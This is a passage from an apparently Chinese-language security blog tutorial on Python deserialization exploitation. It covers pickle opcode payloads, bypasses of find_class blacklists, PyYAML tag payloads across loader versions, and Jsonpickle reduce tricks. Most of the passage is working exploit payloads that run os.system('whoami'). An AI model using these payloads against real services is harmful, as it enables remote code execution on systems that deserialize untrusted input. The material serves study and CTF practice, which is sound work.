class="string">b&quot;c__builtin__\n__import__\n(S&#x27;os&#x27;\ntRp0\n0c__builtin__\ngetattr\n(g0\nS&#x27;system&#x27;\ntRp1\n0g1\n(S&#x27;whoami&#x27;\ntR.&quot;</span></span><br></pre></td></tr></table></figure><p>利用<code>pickletools.dis()</code>转换一下</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">    <span class="number">0</span>: c    GLOBAL     <span class="string">&#x27;__builtin__ __import__&#x27;</span></span><br><span class="line">   <span class="number">24</span>: (    MARK</span><br><span class="line">   <span class="number">25</span>: S        STRING     <span class="string">&#x27;os&#x27;</span></span><br><span class="line">   <span class="number">31</span>: t        TUPLE      (MARK at <span class="number">24</span>)</span><br><span class="line">   <span class="number">32</span>: R    REDUCE</span><br><span class="line">   <span class="number">33</span>: p    PUT        <span class="number">0</span></span><br><span class="line">   <span class="number">36</span>: <span class="number">0</span>    POP</span><br><span class="line">   <span class="number">37</span>: c    GLOBAL     <span class="string">&#x27;__builtin__ getattr&#x27;</span></span><br><span class="line">   <span class="number">58</span>: (    MARK</span><br><span class="line">   <span class="number">59</span>: g        GET        <span class="number">0</span></span><br><span class="line">   <span class="number">62</span>: S        STRING     <span class="string">&#x27;system&#x27;</span></span><br><span class="line">   <span class="number">72</span>: t        TUPLE      (MARK at <span class="number">58</span>)</span><br><span class="line">   <span class="number">73</span>: R    REDUCE</span><br><span class="line">   <span class="number">74</span>: p    PUT        <span class="number">1</span></span><br><span class="line">   <span class="number">77</span>: <span class="number">0</span>    POP</span><br><span class="line">   <span class="number">78</span>: g    GET        <span class="number">1</span></span><br><span class="line">   <span class="number">81</span>: (    MARK</span><br><span class="line">   <span class="number">82</span>: S        STRING     <span class="string">&#x27;whoami&#x27;</span></span><br><span class="line">   <span class="number">92</span>: t        TUPLE      (MARK at <span class="number">81</span>)</span><br><span class="line">   <span class="number">93</span>: R    REDUCE</span><br><span class="line">   <span class="number">94</span>: .    STOP</span><br><span class="line">highest protocol among opcodes = <span class="number">0</span></span><br></pre></td></tr></table></figure><p>上面内容简化下就和上面第一个结构体一样</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">cos</span><br><span class="line">system</span><br><span class="line">(S<span class="string">&#x27;whoami&#x27;</span></span><br><span class="line">tR.</span><br></pre></td></tr></table></figure><p>pker语句就是</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 未使用安全重载语句的代码会自动import os这个包，所以不需要__builtin__.__import__ 去导入</span></span><br><span class="line">system = GLOBAL(<span class="string">&#x27;os&#x27;</span>, <span class="string">&#x27;system&#x27;</span>)</span><br><span class="line">system(<span class="string">&#x27;whoami&#x27;</span>)</span><br></pre></td></tr></table></figure><div class="note success modern"><p><code>i</code>操作符</p></div><p>pker语句</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">INST(<span class="string">&#x27;os&#x27;</span>, <span class="string">&#x27;system&#x27;</span>, <span class="string">&#x27;whoami&#x27;</span>)</span><br></pre></td></tr></table></figure><p>结构体</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">(S<span class="string">&#x27;whoami&#x27;</span></span><br><span class="line">ios</span><br><span class="line">system</span><br><span class="line">.</span><br></pre></td></tr></table></figure><div class="note success modern"><p><code>o</code>操作符</p></div><p>pker语句</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">OBJ(GLOBAL(<span class="string">&#x27;os&#x27;</span>, <span class="string">&#x27;system&#x27;</span>), <span class="string">&#x27;whoami&#x27;</span>) </span><br></pre></td></tr></table></figure><p>结构体</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">(cos</span><br><span class="line">system</span><br><span class="line">S<span class="string">&#x27;whoami&#x27;</span></span><br><span class="line">o.</span><br></pre></td></tr></table></figure><p>上面这三种都是直接去调用os模块，没有用<code>__builtin__.__import__</code> 去导入，这是因为上面已经提到了<code>pickle.loads</code>会解决import问题，整个python标准库的模块函数均可以使用。</p><div class="note success modern"><p><code>c</code>操作符</p></div><p>其实c操作符是基于<code>find_class(moudle, name)</code>来实现的，<code>find_class()</code>函数实现的功能简单来说就是：去<code>moudle</code>模块中找到<code>name</code>，然后对内存原始的数据进行覆盖。<strong>但是需要注意的是，moudle必须在name的顶层。</strong></p><p>举个🌰</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># secret.py</span></span><br><span class="line">name = <span class="string">&#x27;jnzm4x8vgb&#x27;</span></span><br><span class="line">flag = <span class="string">&#x27;flag&#123;cnqbio0yxa9htwkev61ps&#125;&#x27;</span></span><br><span class="line">sign = <span class="string">&#x27;gy3z9urcn2as7f05ot8b&#x27;</span></span><br><span class="line"><span class="comment"># c_flag.py</span></span><br><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> secret</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">pickle_test</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self,name,sign</span>):</span><br><span class="line">        self.name = name</span><br><span class="line">        self.sign = sign</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__eq__</span>(<span class="params">self, other</span>):</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">type</span>(other) <span class="keyword">is</span> pickle_test <span class="keyword">and</span> self.name == other.name <span class="keyword">and</span> self.sign == other.sign</span><br><span class="line"></span><br><span class="line">ser = base64.b64decode(<span class="built_in">input</span>(<span class="string">&quot;input:&quot;</span>))</span><br><span class="line"><span class="built_in">print</span>(ser)</span><br><span class="line"><span class="comment"># 过滤R操作符，防止危险函数</span></span><br><span class="line"><span class="keyword">if</span> <span class="string">b&#x27;R&#x27;</span> <span class="keyword">in</span> ser:</span><br><span class="line">    exit()</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    result = pickle.loads(ser)</span><br><span class="line">    correct = ((result == pickle_test(secret.name, secret.sign)))</span><br><span class="line">    <span class="keyword">if</span> correct:</span><br><span class="line">        <span class="built_in">print</span>(secret.flag)</span><br></pre></td></tr></table></figure><p>直接使用pkel进行生成</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">admin = GLOBAL(<span class="string">&#x27;__main__&#x27;</span>, <span class="string">&#x27;secret&#x27;</span>)</span><br><span class="line">admin.name = <span class="string">&quot;test_name&quot;</span></span><br><span class="line">admin.sign = <span class="string">&quot;123456&quot;</span></span><br><span class="line">pickle_test = INST(<span class="string">&#x27;__main__&#x27;</span>, <span class="string">&#x27;pickle_test&#x27;</span>,<span class="string">&#x27;test_name&#x27;</span>,<span class="string">&#x27;123456&#x27;</span>)</span><br><span class="line"><span class="keyword">return</span> pickle_test</span><br></pre></td></tr></table></figure><p>然后把结果进行base64下，必须使用python的来编码，因为数据类型是字节类型，网页上的是字符型编码</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> pickletools</span><br><span class="line">code=<span class="string">b&quot;c__main__\nsecret\np0\n0g0\n(&#125;(S&#x27;name&#x27;\nS&#x27;test_name&#x27;\ndtbg0\n(&#125;(S&#x27;sign&#x27;\nS&#x27;123456&#x27;\ndtb(S&#x27;test_name&#x27;\nS&#x27;123456&#x27;\ni__main__\npickle_test\np3\n0g3\n.&quot;</span></span><br><span class="line"><span class="comment">#print(pickletools.dis(code))</span></span><br><span class="line">a=base64.b64encode(code)</span><br><span class="line"><span class="built_in">print</span>(a)</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/Ascotbe/Image/master/CodeAudit/Python/6.png" alt="image-20221004221948876"></p><div class="note success modern"><p><code>b</code>操作符</p></div><p>对已有的一个类使用__setstate__()方法进行覆盖</p><blockquote><p>当解封时，如果类<strong>定义</strong>了 <a href="https://docs.python.org/zh-cn/3/library/pickle.html?highlight=pickle#object.__setstate__"><code>__setstate__()</code></a>，就会在已解封状态下调用它。此时不要求实例的 state 对象必须是 dict。没有定义此方法的话，先前封存的 state 对象必须是 dict，且该 dict 内容会在解封时赋给新实例的 <strong>dict</strong>。</p></blockquote><p>如果一个类（暂且称之为<code>Test</code>），它原先是没有定义<code>__setstate__</code>方法的，如果我们现在使用<code>&#123;&quot;__setstate__&quot;: os.system&#125;</code>这个字典来初始化<code>test</code>类的对象（<code>b</code>操作符），现在这个对象便具有了<code>__setstate__</code>方法，之后我们再把待执行的命令作为参数（以<code>whoami</code>为例），再次使用<code>b</code>操作符来执行<code>BUILD</code>指令，由于此时对象存在<code>__setstate__</code>方法，所以便会执行<code>os.system(&#39;whoami&#39;)</code>，成功实现了RCE。</p><p>构建代码</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> pickletools</span><br><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Test</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line">date = <span class="string">b&#x27;c__main__\nTest\n)\x81&#125;(V__setstate__\ncos\nsystem\nubVwhoami\nb.&#x27;</span></span><br><span class="line">pickletools.dis(date)</span><br><span class="line">pickle.loads(date)</span><br></pre></td></tr></table></figure><p>然后返回结果如下，必须有一个类可以使用，并且没有使用<code>__setstate__</code></p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">    <span class="number">0</span>: c    GLOBAL     <span class="string">&#x27;__main__ Test&#x27;</span></span><br><span class="line">   <span class="number">15</span>: )    EMPTY_TUPLE</span><br><span class="line">   <span class="number">16</span>: \x81 NEWOBJ</span><br><span class="line">   <span class="number">17</span>: &#125;    EMPTY_DICT</span><br><span class="line">   <span class="number">18</span>: (    MARK</span><br><span class="line">   <span class="number">19</span>: V        UNICODE    <span class="string">&#x27;__setstate__&#x27;</span>       <span class="comment"># 引入__setstate__</span></span><br><span class="line">   <span class="number">33</span>: c        GLOBAL     <span class="string">&#x27;os system&#x27;</span>          <span class="comment"># 利用c操作码来引入os.system</span></span><br><span class="line">   <span class="number">44</span>: u        SETITEMS   (MARK at <span class="number">18</span>)</span><br><span class="line">   <span class="number">45</span>: b    BUILD                               <span class="comment"># 执行一次BUILD</span></span><br><span class="line">   <span class="number">46</span>: V    UNICODE    <span class="string">&#x27;whoami&#x27;</span>                 <span class="comment"># 引入命令</span></span><br><span class="line">   <span class="number">54</span>: b    BUILD                               <span class="comment"># 再次执行一次，因为已经纯在设置好的__setstate__，所以会照成命令执行</span></span><br><span class="line">   <span class="number">55</span>: .    STOP</span><br><span class="line">highest protocol among opcodes = <span class="number">2</span></span><br><span class="line">ascotbe                                         <span class="comment"># 命令执行结果</span></span><br></pre></td></tr></table></figure><div class="note warning modern"><p>重写find_class()：不一定绝对安全</p></div><p>官方给出的安全反序列化是继承了<code>pickle.Pickler</code>类，并重载了<code>find_class</code>方法，父类原本的操作是把module导入<code>sys.module</code>缓存中（并未导入全局或局部作用域），然后getattr取值，所以重载该方法后即可对module和name进行限制，但<code>find_class</code>的限制仅仅是对该函数参数过滤，并没有hook <code>__import__</code>等函数，所以通过<code>eval(&#39;__import__(\&#39;xx\&#39;)&#39;)</code>等即可绕过。</p><p>下面的例子来自于python官方文档，通过白名单来现在函数运行：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> builtins</span><br><span class="line"><span class="keyword">import</span> io</span><br><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"></span><br><span class="line">safe_builtins = &#123;</span><br><span class="line">    <span class="string">&#x27;range&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;complex&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;set&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;frozenset&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;slice&#x27;</span>,</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">RestrictedUnpickler</span>(pickle.Unpickler):</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">find_class</span>(<span class="params">self, module, name</span>):</span><br><span class="line">        <span class="comment"># Only allow safe classes from builtins.</span></span><br><span class="line">        <span class="keyword">if</span> module == <span class="string">&quot;builtins&quot;</span> <span class="keyword">and</span> name <span class="keyword">in</span> safe_builtins:</span><br><span class="line">            <span class="keyword">return</span> <span class="built_in">getattr</span>(builtins, name)</span><br><span class="line">        <span class="comment"># Forbid everything else.</span></span><br><span class="line">        <span class="keyword">raise</span> pickle.UnpicklingError(<span class="string">&quot;global &#x27;%s.%s&#x27; is forbidden&quot;</span> %</span><br><span class="line">                                     (module, name))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">restricted_loads</span>(<span class="params">s</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;Helper function analogous to pickle.loads().&quot;&quot;&quot;</span></span><br><span class="line">    <span class="keyword">return</span> RestrictedUnpickler(io.BytesIO(s)).load()</span><br></pre></td></tr></table></figure><p>而我们做题一般都是遇到使用黑名单来操作的</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> io</span><br><span class="line"><span class="keyword">import</span> builtins</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">RestrictedUnpickler</span>(pickle.Unpickler):</span><br><span class="line">    blacklist = &#123;<span class="string">&#x27;eval&#x27;</span>, <span class="string">&#x27;exec&#x27;</span>, <span class="string">&#x27;execfile&#x27;</span>, <span class="string">&#x27;compile&#x27;</span>, <span class="string">&#x27;open&#x27;</span>, <span class="string">&#x27;input&#x27;</span>, <span class="string">&#x27;__import__&#x27;</span>, <span class="string">&#x27;exit&#x27;</span>&#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">find_class</span>(<span class="params">self, module, name</span>):</span><br><span class="line">        <span class="keyword">if</span> module == <span class="string">&#x27;builtins&#x27;</span> <span class="keyword">and</span> name <span class="keyword">not</span> <span class="keyword">in</span> self.blacklist:</span><br><span class="line">            <span class="keyword">return</span> <span class="built_in">getattr</span>(builtins, name)</span><br><span class="line">        <span class="keyword">raise</span> pickle.UnpicklingError(</span><br><span class="line">            <span class="string">&quot;global &#x27;%s.%s&#x27; is forbidden&quot;</span> % (module, name))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">restricted_loads</span>(<span class="params">s</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;Helper function analogous to pickle.loads().&quot;&quot;&quot;</span></span><br><span class="line">    <span class="keyword">return</span> RestrictedUnpickler(io.BytesIO(s)).load()</span><br><span class="line"></span><br><span class="line">restricted_loads(<span class="string">b&quot;&quot;</span>)</span><br></pre></td></tr></table></figure><p>题目并没有过滤<code>getattr</code>，我们可以通过该方法来获取到<code>builtins</code>下的<code>eval</code>等危险函数，一个常规的思路就是<code>getattar(builtins, &#39;eval&#39;)</code>，利用之前类继承方式来执行代码即可（魔术函数）</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="string">b&quot;cbuiltins\ngetattr\n(cbuiltins\ndict\nVget\ntR(cbuiltins\nglobals\n(tRVbuiltins\ntRp1\ncbuiltins\ngetattr\n(g1\nVeval\ntR(V__import__(&#x27;os&#x27;).system(&#x27;whoami&#x27;)\ntR.&quot;</span></span><br></pre></td></tr></table></figure><h4 id="PyYAML"><a href="#PyYAML" class="headerlink" title="PyYAML"></a>PyYAML</h4><p>yaml本身支持强制类型转化，强制转化为str类型就是<code>!!str</code>，五个功能强大的yaml标签，支持转化为指定的python模块，类，方法以及对象实例</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">!!python/<span class="built_in">object</span>/new:module.cls<span class="comment"># module.cls instance  # 能够直接执行命令 </span></span><br><span class="line">!!python/<span class="built_in">object</span>/apply:module.f<span class="comment"># value of f(...)      # 能够直接执行命令 </span></span><br><span class="line">!!python/name:module.name<span class="comment"># module.name          # 需要特定条件才可以执行命令 </span></span><br><span class="line">!!python/module:package.module<span class="comment"># package.module       # 需要特定条件才可以执行命令 </span></span><br><span class="line">!!python/<span class="built_in">object</span>:module.cls<span class="comment"># module.cls instance  # 需要特定条件才可以执行命令 </span></span><br></pre></td></tr></table></figure><h5 id="PyYAML-lt-5-1"><a href="#PyYAML-lt-5-1" class="headerlink" title="PyYAML&lt;=5.1"></a>PyYAML&lt;=5.1</h5><p>序列化数据</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">load(data)  <span class="comment"># 加载单个YAML配置，作用是将yaml类型数据转化为python对象包括自定义的对象实例、字典、列表等类型数据</span></span><br><span class="line">load(data, Loader=yaml.Loader)  <span class="comment"># 指定加载器有BaseLoader、SafeLoader</span></span><br><span class="line">load_all(data)  <span class="comment"># 加载多个YAML配置</span></span><br><span class="line">load_all(data, Loader=yaml.Loader)  <span class="comment"># 指定加载器</span></span><br></pre></td></tr></table></figure><p>Loader就是用来指定加载器</p><ul><li><code>BaseConstructor</code>：最最基础的构造器，不支持强制类型转换</li><li><code>SafeConstructor</code>：集成 BaseConstructor，强制类型转换和 YAML 规范保持一致，没有魔改</li><li><code>Constructor</code>：在 YAML 规范上新增了很多强制类型转换（5.1以下默认此加载器，很危险）</li></ul><p>反序列化数据</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">dump(data)  <span class="comment"># 接收的参数就是python对象包括对象实例、字典、列表等类型数据</span></span><br></pre></td></tr></table></figure><h6 id="五个complex标签的利用"><a href="#五个complex标签的利用" class="headerlink" title="五个complex标签的利用"></a>五个complex标签的利用</h6><div class="note success modern"><p>!!python/object/apply</p></div><p>进入yaml模块源码yaml/constructor.py中，最终进入了<code>find_python_name</code>方法，通过<code>__import__</code>将模块导入进来。</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">yaml.load(<span class="string">&quot;!!python/object/apply:os.system [whoami]&quot;</span>)  <span class="comment"># 命令的单双引号加不加都可以</span></span><br><span class="line"></span><br><span class="line">yaml.load(<span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">!!python/object/apply:os.system</span></span><br><span class="line"><span class="string">- whoami</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span>)</span><br><span class="line"></span><br><span class="line">yaml.load(<span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">!!python/object/apply:os.system</span></span><br><span class="line"><span class="string">  args: [&quot;whoami&quot;]</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span>)</span><br></pre></td></tr></table></figure><div class="note success modern"><p>!!python/object/new</p></div><p>原理跟上面一样，最终进入了<code>find_python_name</code>方法，通过<code>__import__</code>将模块导入进来</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">yaml.load(<span class="string">&quot;!!python/object/new:os.system [whoami]&quot;</span>)</span><br><span class="line"></span><br><span class="line">yaml.load(<span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">!!python/object/new:os.system</span></span><br><span class="line"><span class="string">- whoami</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span>)</span><br><span class="line"></span><br><span class="line">yaml.load(<span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">!!python/object/new:os.system</span></span><br><span class="line"><span class="string">  args: [&quot;whoami&quot;]</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span>)</span><br></pre></td></tr></table></figure><div class="note success modern"><p>!!python/object、!!python/module、!!python/name</p></div><p>这三个不能直接执行命令的标签，条件允许其实有其他办法，比如利用现有文件上传或者写文件的功能，传入一个写入命令执行代码的文件。比如说同级目录下面有两个文件（同一个文件内用法同理）</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># yaml_test.py</span></span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line">os.system(<span class="string">&#x27;whoami&#x27;</span>)</span><br></pre></td></tr></table></figure><p>另一个文件里面</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> yaml</span><br><span class="line"></span><br><span class="line">yaml.load(<span class="string">&quot;!!python/module:yaml_test&quot;</span> )</span><br><span class="line"><span class="comment"># 下面两条exp方法是随意写的，是不存在的，但必须要有，因为这是命名规则，不然会报错，主要是文件名yaml_test要写对。会执行但是执行完会报错。</span></span><br><span class="line">yaml.load(<span class="string">&quot;!!python/object:yaml_test.exp&quot;</span> )</span><br><span class="line">yaml.load(<span class="string">&quot;!!python/name:yaml_test.exp&quot;</span> )</span><br></pre></td></tr></table></figure><p>当然<code>!!python/object/new</code>和<code>!!python/object/apply</code>也可以用这种方式实现利用，同理会执行但是执行完会报错。</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">yaml.load(<span class="string">&#x27;!!python/object/apply:yaml_test.exp &#123;&#125;&#x27;</span> )</span><br><span class="line">yaml.load(<span class="string">&#x27;!!python/object/new:yaml_test.exp &#123;&#125;&#x27;</span> )</span><br></pre></td></tr></table></figure><p>如果不在同一目录下</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">├── test_file.py</span><br><span class="line">└── uploads</span><br><span class="line">    └── yaml_test.py</span><br></pre></td></tr></table></figure><p>修改下payload，在文件名前加入目录名可</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#经过测试只有modle标签可行</span></span><br><span class="line">yaml.load(<span class="string">&quot;!!python/module:uploads.yaml_test&quot;</span> )</span><br></pre></td></tr></table></figure><p><code>!!python/object/new</code>和<code>!!python/object/apply</code>加个目录即可</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#exp表示着类实例，可以写成其他，虽不存在但是一定要有，否则报错</span></span><br><span class="line">yaml.load(<span class="string">&#x27;!!python/object/apply:uploads.exp &#123;&#125;&#x27;</span> )</span><br><span class="line">yaml.load(<span class="string">&#x27;!!python/object/new:uploads.exp &#123;&#125;&#x27;</span> )</span><br></pre></td></tr></table></figure><h5 id="PyYAML-gt-5-1"><a href="#PyYAML-gt-5-1" class="headerlink" title="PyYAML&gt;5.1"></a>PyYAML&gt;5.1</h5><p>这个版本中更新了一下方法，截止文章编写时PyYAML的最新版本为6，POC都可以使用</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">load(data) [works under certain conditions]</span><br><span class="line">load(data, Loader=Loader)</span><br><span class="line">load(data, Loader=UnsafeLoader)</span><br><span class="line">load(data, Loader=FullLoader)</span><br><span class="line">load_all(data) [works under certain condition]</span><br><span class="line">load_all(data, Loader=Loader)</span><br><span class="line">load_all(data, Loader=UnSafeLoader)</span><br><span class="line">load_all(data, Loader=FullLoader)</span><br><span class="line">full_load(data)</span><br><span class="line">full_load_all(data)</span><br><span class="line">unsafe_load(data)</span><br><span class="line">unsafe_load_all(data)</span><br></pre></td></tr></table></figure><p>在5.1之后的yaml中load函数被限制使用了，会被警告提醒加上一个参数 Loader</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">test.py:<span class="number">3</span>: YAMLLoadWarning: calling yaml.load() without Loader=... <span class="keyword">is</span> deprecated, <span class="keyword">as</span> the default Loader <span class="keyword">is</span> unsafe. Please read https:</span><br></pre></td></tr></table></figure><p>针对不同的需要，选择不同的加载器，有以下几种加载器</p><ul><li>BaseConstructor：仅加载最基本的YAML</li><li>SafeConstructor：安全加载Yaml语言的子集，建议用于加载不受信任的输入（safe_load)</li><li>FullConstructor：加载的模块必须位于 <code>sys.modules</code> 中（说明程序已经 import 过了才让加载）。这个是默认的加载器。</li><li>UnsafeConstructor（也称为Loader向后兼容性）：原始的Loader代码，可以通过不受信任的数据输入轻松利用（unsafe_load）</li><li>Constructor：等同于UnsafeConstructor</li></ul><p>Fullloader加载模式的对漏洞利用的限制</p><ol><li><p>如果不执行只是为了单纯导入模块，那么需要<code>sys.modules</code>字典中有我们的模块，否则报错</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">yaml.constructor.ConstructorError: <span class="keyword">while</span> constructing a Python <span class="built_in">object</span></span><br><span class="line">module <span class="string">&#x27;subprocess&#x27;</span> <span class="keyword">is</span> <span class="keyword">not</span> imported</span><br></pre></td></tr></table></figure></li><li><p>如果要执行，那么<code>sys.modules</code>字典中要有利用模块，并且加载进来的 <code>module.name</code> 必须是一个类而不能是方法，否则就会报错</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">yaml.constructor.ConstructorError: <span class="keyword">while</span> constructing a Python instance</span><br><span class="line">expected a <span class="keyword">class</span>, but found &lt;<span class="keyword">class</span> <span class="string">&#x27;builtin_function_or_method&#x27;</span>&gt;</span><br></pre></td></tr></table></figure></li></ol><div class="note default modern"><p>说人话就是：不在能够自动通过<code>__import__</code>将模块导入进来，需要使用内置函数或魔术函数方式来使用</p></div><p>那我们直接构造</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># tuple(map(eval, [&quot;__import__(&#x27;os&#x27;).system(&#x27;whoami&#x27;)&quot;]))</span></span><br><span class="line"><span class="comment"># 变为yaml就是payload_1</span></span><br><span class="line"><span class="comment"># payload_1</span></span><br><span class="line">yaml.load(<span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">!!python/object/new:tuple</span></span><br><span class="line"><span class="string">- !!python/object/new:map</span></span><br><span class="line"><span class="string">  - !!python/name:eval</span></span><br><span class="line"><span class="string">  - [&quot;__import__(&#x27;os&#x27;).system(&#x27;whoami&#x27;)&quot;]</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span>,Loader=yaml.Loader)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 创建了一个类型为z的新对象,而对象中extend属性在创建时会被调用,参数为listitems内的参数</span></span><br><span class="line"><span class="comment"># payload_2</span></span><br><span class="line">yaml.load(<span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">!!python/object/new:type</span></span><br><span class="line"><span class="string">  args: [&quot;z&quot;, !!python/tuple [], &#123;&quot;extend&quot;: !!python/name:exec &#125;]</span></span><br><span class="line"><span class="string">  listitems: &quot;__import__(&#x27;os&#x27;).system(&#x27;whoami&#x27;)&quot;</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span>,Loader=yaml.Loader)</span><br><span class="line">  </span><br><span class="line"><span class="comment"># 报错但是执行了</span></span><br><span class="line"><span class="comment"># payload_3</span></span><br><span class="line">yaml.load(<span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">- !!python/object/new:str</span></span><br><span class="line"><span class="string">    args: []</span></span><br><span class="line"><span class="string">    state: !!python/tuple</span></span><br><span class="line"><span class="string">    - &quot;__import__(&#x27;os&#x27;).system(&#x27;whoami&#x27;)&quot;</span></span><br><span class="line"><span class="string">    - !!python/object/new:staticmethod</span></span><br><span class="line"><span class="string">      args: [0]</span></span><br><span class="line"><span class="string">      state:</span></span><br><span class="line"><span class="string">        update: !!python/name:exec</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span>,Loader=yaml.Loader)</span><br><span class="line"><span class="comment"># payload_4</span></span><br><span class="line">yaml.load(<span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">- !!python/object/new:yaml.MappingNode</span></span><br><span class="line"><span class="string">  listitems: !!str &#x27;!!python/object/apply:subprocess.Popen [whoami]&#x27;</span></span><br><span class="line"><span class="string">  state:</span></span><br><span class="line"><span class="string">    tag: !!str dummy</span></span><br><span class="line"><span class="string">    value: !!str dummy</span></span><br><span class="line"><span class="string">    extend: !!python/name:yaml.unsafe_load</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span>,Loader=yaml.Loader)</span><br></pre></td></tr></table></figure><h4 id="Jsonpickle"><a href="#Jsonpickle" class="headerlink" title="Jsonpickle"></a>Jsonpickle</h4><p>用于将任意对象序列化为JSON的Python库。<code>Jsonpickle</code>可以使用几乎所有Python对象并将该对象转换为JSON。另外，它可以将对象重新构造回Python。</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> jsonpickle</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">EXP</span>(<span class="title class_ inherited__">object</span>):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__reduce__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">return</span> (<span class="built_in">__import__</span>(<span class="string">&#x27;os&#x27;</span>).system, (<span class="string">&#x27;whoami&#x27;</span>,))</span><br><span class="line">poc = jsonpickle.encode(EXP())  <span class="comment"># 把实例化的类转换成json数据</span></span><br><span class="line"><span class="built_in">print</span>(poc)</span><br></pre></td></tr></table></figure><p>然后直接调用<code>decode()</code>函数来执行即可</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">jsonpickle.decode(<span class="string">&quot;&quot;&quot;&#123;&quot;py/reduce&quot;: [&#123;&quot;py/function&quot;: &quot;os.system&quot;&#125;, &#123;&quot;py/tuple&quot;: [&quot;whoami&quot;]&#125;]&#125;&quot;&quot;&quot;</span>)</span><br></pre></td></tr></table></figure><h4 id="Marshal"><a href="#Marshal" class="headerlink" title="Marshal"></a>Marshal</h4><p>由于<code>pickle</code>不能序列化code对象，所以在python2.6后新增<code>marshal</code>来处理code对象的序列化。</p><div class="note warning modern"><p>这个包没办法直接执行命令，需要多方函数配合，有点鸡肋</p></div><p>如果直接dumps一个函数后然后再loads是没办法执行的，而是需要用到了 Python 的一个面向对象的特性，Python 能通过 <code>types.FunctionTyle(func_code,globals(),&#39;&#39;)()</code>来动态地创建匿名函数</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> pickle,base64</span><br><span class="line"><span class="keyword">import</span> marshal</span><br><span class="line"><span class="keyword">import</span> types</span><br><span 